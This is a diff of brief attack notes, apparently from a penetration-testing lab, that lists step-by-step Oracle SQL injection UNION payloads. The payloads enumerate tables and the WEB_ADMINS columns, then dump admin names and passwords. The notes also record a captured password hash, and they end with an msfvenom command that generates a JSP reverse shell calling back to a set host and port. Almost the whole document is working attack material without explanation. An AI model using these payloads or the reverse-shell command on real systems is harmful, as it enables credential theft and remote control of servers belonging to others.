@@ -1,12 +1,12 @@
 # return all tables name found admin table
-1':-> ' UNION SELECT table_name, null, null FROM all_tables --
+1:-> ' UNION SELECT table_name, null, null FROM all_tables --
 
 # found the columns name of admin table
-2':-> ' UNION SELECT column_name, null, null FROM all_tab_columns WHERE table_name = 'WEB_ADMINS' --
+2:-> ' UNION SELECT column_name, null, null FROM all_tab_columns WHERE table_name = 'WEB_ADMINS' --
 
 # return admin id, name, and password
 # admin password (d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892)
-3':-> ' UNION SELECT admin_name, password, admin_id FROM web_admins --
+3:-> ' UNION SELECT admin_name, password, admin_id FROM web_admins --
 
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.136 LPORT=12345 -f raw > reverse.jsp
